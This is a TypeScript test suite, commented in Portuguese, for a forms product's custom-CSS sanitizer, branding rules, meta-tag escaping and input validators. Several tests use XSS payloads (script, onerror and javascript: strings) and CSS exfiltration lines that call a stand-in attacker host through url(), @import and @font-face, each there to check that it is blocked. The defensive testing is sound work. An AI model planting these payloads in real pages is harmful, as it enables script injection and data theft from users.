import { describe, expect, it } from 'vitest';
import {
  buildMetaTags,
  effectiveBranding,
  escapeHtml,
  isValidAssetUrl,
  isValidBrandColor,
  renderMetaTags,
  sanitizeCustomCss,
} from '@forms/shared';

/**
 * CSS customizado e meta tags do white-label.
 *
 * O CSS é texto escrito por um cliente que termina dentro de uma `<style>` numa
 * página que nós servimos — inclusive em `<app>/f/<slug>`, o domínio onde vivem
 * as sessões de todo mundo. Um escape daqui é XSS, não questão de estilo.
 */

/** Atalho: só o CSS que sobreviveu. */
function limpo(entrada: string): string {
  return sanitizeCustomCss(entrada).css;
}

describe('CSS que passa', () => {
  it('mantém uma regra simples', () => {
    const resultado = sanitizeCustomCss('.campo { color: #333333; padding: 12px; }');

    expect(resultado.css).toContain('color: #333333;');
    expect(resultado.css).toContain('padding: 12px;');
    expect(resultado.removidos).toEqual([]);
  });

  it('mantém várias regras e normaliza o espaçamento', () => {
    const resultado = limpo(`
      .titulo   {  font-size:   24px  }
      .botao { background-color: #2563eb; border-radius: 8px }
    `);

    expect(resultado).toContain('.titulo { font-size: 24px; }');
    expect(resultado).toContain('background-color: #2563eb;');
  });

  it('mantém @media com o conteúdo dentro', () => {
    const resultado = limpo('@media (max-width: 640px) { .campo { padding: 8px } }');

    expect(resultado).toContain('@media (max-width: 640px)');
    expect(resultado).toContain('padding: 8px;');
  });

  it('mantém @keyframes', () => {
    const resultado = limpo('@keyframes surgir { from { opacity: 0 } to { opacity: 1 } }');

    expect(resultado).toContain('@keyframes surgir');
    expect(resultado).toContain('opacity: 0;');
    expect(resultado).toContain('opacity: 1;');
  });

  it('mantém seletores com combinadores', () => {
    // `>` é combinador de filho e precisa passar — o que não pode aparecer em
    // lugar nenhum é `<`.
    const resultado = limpo('.form > .campo:not(.oculto) { margin-top: 4px }');
    expect(resultado).toContain('.form > .campo:not(.oculto)');
  });

  it('descarta comentários', () => {
    expect(limpo('/* nota */ .a { color: #000000 } /* outra */')).not.toContain('nota');
  });
});

describe('fuga da tag style', () => {
  it('nenhuma entrada produz `<` na saída', () => {
    // Esta é a propriedade que sustenta tudo: sem `<`, não existe `</style>`,
    // e sem `</style>` não existe fuga para dentro do HTML.
    const ataques = [
      '</style><script>alert(1)</script>',
      '.a { color: red } </style><img src=x onerror=alert(1)>',
      '.a { color: #000000; } </STYLE ><svg onload=alert(1)>',
      '@media screen { </style> .a { color: red } }',
      '.a[title="</style>"] { color: #000000 }',
      'a { font-family: "</style><script>" }',
    ];

    for (const ataque of ataques) {
      expect(limpo(ataque), ataque).not.toContain('<');
    }
  });

  it('remove a regra inteira quando o seletor tem caractere proibido', () => {
    const resultado = sanitizeCustomCss('</style><script>alert(1)</script> .a { color: #000000 }');

    expect(resultado.css).toBe('');
    expect(resultado.removidos.length).toBeGreaterThan(0);
  });
});

describe('exfiltração e execução', () => {
  it('recusa url() em qualquer propriedade', () => {
    // `background: url(https://atacante/?c=…)` dispara um GET só de a regra
    // casar. É exfiltração sem script nenhum.
    for (const entrada of [
      '.a { background: url(https://atacante.test/pixel) }',
      '.a { background-color: url("https://atacante.test/x") }',
      '.a { border: 1px solid url( https://atacante.test ) }',
    ]) {
      expect(limpo(entrada), entrada).not.toContain('url');
    }
  });

  it('recusa escapes CSS, que codificam url() por outro caminho', () => {
    // `\75 rl(` é `url(`. Barra invertida em valor não tem uso legítimo aqui.
    expect(limpo('.a { background: \\75 rl(https://atacante.test) }')).toBe('');
  });

  it('recusa expression() e javascript:', () => {
    expect(limpo('.a { width: expression(alert(1)) }')).toBe('');
    expect(limpo('.a { background: javascript:alert(1) }')).toBe('');
  });

  it('recusa @import', () => {
    const resultado = sanitizeCustomCss('@import url("https://atacante.test/x.css"); .a { color: #000000 }');

    expect(resultado.css).not.toContain('import');
    // A regra legítima depois do @import continua valendo.
    expect(resultado.css).toContain('color: #000000;');
    expect(resultado.removidos.join(' ')).toContain('@import');
  });

  it('recusa @font-face, que existe para carregar arquivo externo', () => {
    const resultado = sanitizeCustomCss('@font-face { font-family: x; src: url(https://atacante.test/f.woff) }');

    expect(resultado.css).toBe('');
    expect(resultado.removidos.join(' ')).toContain('@font-face');
  });
});

describe('propriedades fora da lista', () => {
  it('recusa position, que permite sobreposição de página inteira', () => {
    const resultado = sanitizeCustomCss('.a { position: fixed; top: 0; color: #000000 }');

    expect(resultado.css).not.toContain('position');
    expect(resultado.css).toContain('color: #000000;');
  });

  it('recusa content, behavior e -moz-binding', () => {
    for (const propriedade of ['content', 'behavior', '-moz-binding', 'pointer-events', 'cursor']) {
      const resultado = limpo(`.a { ${propriedade}: algo }`);
      expect(resultado, propriedade).toBe('');
    }
  });

  it('remove !important sem remover a declaração', () => {
    // A folha do cliente já vem depois da nossa; ela ganha sem precisar disso,
    // e com `!important` ela venceria também estilo de erro e de foco.
    const resultado = limpo('.a { color: #ff0000 !important }');

    expect(resultado).toContain('color: #ff0000;');
    expect(resultado).not.toContain('important');
  });

  it('explica o que removeu, em português', () => {
    const { removidos } = sanitizeCustomCss('.a { position: fixed }');
    expect(removidos[0]).toContain('position');
  });
});

describe('entrada malformada', () => {
  it('não lança com chave sem par', () => {
    expect(() => sanitizeCustomCss('.a { color: #000000')).not.toThrow();
    expect(() => sanitizeCustomCss('}}}{{{ ')).not.toThrow();
  });

  it('não lança com entrada vazia ou só espaço', () => {
    expect(sanitizeCustomCss('').css).toBe('');
    expect(sanitizeCustomCss('   \n  ').css).toBe('');
  });

  it('corta entrada gigante em vez de processá-la inteira', () => {
    const gigante = '.a { color: #000000 }'.repeat(5000);
    const resultado = sanitizeCustomCss(gigante);

    expect(resultado.removidos.join(' ')).toContain('20000');
    expect(resultado.css.length).toBeLessThanOrEqual(20_000 * 2);
  });

  it('para de descer depois de alguns níveis de aninhamento', () => {
    const fundo = `${'@media screen {'.repeat(20)}.a{color:#000000}${'}'.repeat(20)}`;
    expect(() => sanitizeCustomCss(fundo)).not.toThrow();
  });

  it('descarta bloco que ficou sem nenhuma declaração válida', () => {
    expect(limpo('.a { position: fixed }')).toBe('');
    expect(limpo('@media screen { .a { position: fixed } }')).toBe('');
  });
});

describe('branding efetivo por plano', () => {
  const organizacao = {
    name: 'Clínica Beta',
    logoUrl: 'https://cdn.beta.test/logo.png',
    faviconUrl: null,
    primaryColor: '#0f766e',
    metaTitle: null,
    metaDescription: null,
    ogImageUrl: null,
    customCss: '.campo { color: #111111 }',
  };

  it('plano sem CSS customizado não serve o CSS, mas o banco o mantém', () => {
    // Quem baixou de plano recupera o visual ao reassinar. Guardar e aplicar
    // são decisões diferentes.
    const resultado = effectiveBranding(organizacao, { removeBranding: true, customCss: false });

    expect(resultado.customCss).toBe('');
    expect(organizacao.customCss).toBe('.campo { color: #111111 }');
  });

  it('plano com CSS customizado serve o CSS já sanitizado', () => {
    const resultado = effectiveBranding(
      { ...organizacao, customCss: '.campo { color: #111111; position: fixed }' },
      { removeBranding: true, customCss: true },
    );

    expect(resultado.customCss).toContain('color: #111111;');
    expect(resultado.customCss).not.toContain('position');
  });

  it('plano sem remoção de marca mantém o rodapé', () => {
    expect(effectiveBranding(organizacao, { removeBranding: false, customCss: false }).showBranding).toBe(true);
    expect(effectiveBranding(organizacao, { removeBranding: true, customCss: false }).showBranding).toBe(false);
  });
});

describe('meta tags', () => {
  const base = {
    formTitle: 'Pesquisa de satisfação',
    organizationName: 'Clínica Beta',
    showBranding: true,
    productName: 'Formulários',
  };

  it('usa o título do formulário quando não há título próprio', () => {
    expect(buildMetaTags(base).title).toBe('Pesquisa de satisfação · Formulários');
  });

  it('some com o nome do produto quando o white-label está ativo', () => {
    // Seção 12: mensagens ao respondente não mencionam a plataforma quando o
    // white-label está ligado.
    const { title } = buildMetaTags({ ...base, showBranding: false });

    expect(title).toBe('Pesquisa de satisfação');
    expect(title).not.toContain('Formulários');
  });

  it('marca noindex', () => {
    // Link de formulário circula por WhatsApp. Indexado, ele vira contexto
    // exposto que o cliente não pediu.
    const robots = buildMetaTags(base).tags.find((tag) => tag.key === 'robots');
    expect(robots?.content).toContain('noindex');
  });

  it('usa summary_large_image só quando há imagem', () => {
    expect(buildMetaTags(base).tags.find((t) => t.key === 'twitter:card')?.content).toBe('summary');
    expect(
      buildMetaTags({ ...base, ogImageUrl: 'https://cdn.beta.test/og.png' }).tags.find(
        (t) => t.key === 'twitter:card',
      )?.content,
    ).toBe('summary_large_image');
  });

  it('escapa o que vem do banco', () => {
    // O título e o nome da empresa são digitados pelo cliente e terminam dentro
    // de um atributo HTML entre aspas. Sem escape, `"` fecha o atributo.
    const html = renderMetaTags(
      buildMetaTags({
        ...base,
        formTitle: '"><script>alert(1)</script>',
        organizationName: 'Beta & Cia "oficial"',
      }),
    );

    expect(html).not.toContain('<script>');
    expect(html).toContain('&lt;script&gt;');
    expect(html).toContain('&amp;');
    expect(html).toContain('&quot;');
  });

  it('escapa também o favicon', () => {
    const html = renderMetaTags({
      ...buildMetaTags(base),
      faviconUrl: 'https://cdn.test/i.png"><script>alert(1)</script>',
    });

    expect(html).not.toContain('<script>');
    expect(html).toContain('rel="icon"');
  });

  it('renderiza o que buildMetaTags decidiu, sem recalcular', () => {
    // A página e a resposta JSON precisam contar a mesma história. Duas
    // chamadas independentes seriam duas chances de divergir.
    const resolvido = buildMetaTags({ ...base, showBranding: false });
    const html = renderMetaTags(resolvido);

    expect(html).toContain(`<title>${resolvido.title}</title>`);
    expect(html).not.toContain('Formulários');
  });
});

describe('validações de campo', () => {
  it('aceita só cor #RRGGBB', () => {
    expect(isValidBrandColor('#2563eb')).toBe(true);
    expect(isValidBrandColor('  #2563EB  ')).toBe(true);
    // `var()` e `url()` numa cor abririam exatamente o que o sanitizador fecha.
    for (const invalida of ['red', '#25f', 'var(--x)', 'url(https://x)', 'rgb(0,0,0)']) {
      expect(isValidBrandColor(invalida), invalida).toBe(false);
    }
  });

  it('aceita só imagem em https', () => {
    expect(isValidAssetUrl('https://cdn.empresa.com.br/logo.png')).toBe(true);
    // http numa página https vira aviso de conteúdo misto no navegador de quem
    // responde — e a página é do cliente.
    expect(isValidAssetUrl('http://cdn.empresa.com.br/logo.png')).toBe(false);
    expect(isValidAssetUrl('javascript:alert(1)')).toBe(false);
    expect(isValidAssetUrl('data:image/png;base64,AAAA')).toBe(false);
    expect(isValidAssetUrl('logo.png')).toBe(false);
  });

  it('escapeHtml cobre os cinco caracteres', () => {
    expect(escapeHtml(`<>&"'`)).toBe('&lt;&gt;&amp;&quot;&#39;');
  });
});
